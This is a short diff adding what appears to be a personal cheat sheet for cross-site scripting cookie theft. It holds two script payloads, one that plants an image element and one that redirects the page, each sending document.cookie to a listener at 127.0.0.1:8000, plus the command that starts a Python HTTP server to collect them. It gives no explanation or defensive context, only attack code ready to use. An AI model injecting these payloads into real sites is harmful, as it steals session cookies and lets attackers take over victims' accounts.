@@ -1,0 +1,11 @@
+#send cookie no redirct
+
+XSS<script>var elem = document.createElement("img");elem.setAttribute("src", "http://127.0.0.1:8000?q="+document.cookie);document.getElementsByTagName("body")[0].appendChild(elem)</script>
+
+#send cookie redirct
+
+XSS<script>document.location="http://127.0.0.1:8000?q="+document.cookie</script>
+
+#start python http server
+
+python -m SimpleHTTPServer
